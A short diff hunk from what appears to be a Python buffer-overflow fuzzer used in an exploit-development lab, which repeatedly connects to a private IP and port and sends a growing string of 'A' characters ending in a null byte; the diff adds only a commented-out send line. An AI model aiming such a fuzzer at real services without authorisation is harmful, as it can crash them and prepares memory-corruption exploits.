@@ -10,6 +10,7 @@ while True:
                 s.connect(('192.168.132.130',1435))
                 print("Sending: %s" % str(len(buffer)))
                 s.send((buffer + "\x00"))
+                #s.send((stack + '\r\n')) new line character \x00--> null byte character
                 s.close()
                 sleep(4)
                 buffer = buffer + "A" * 100
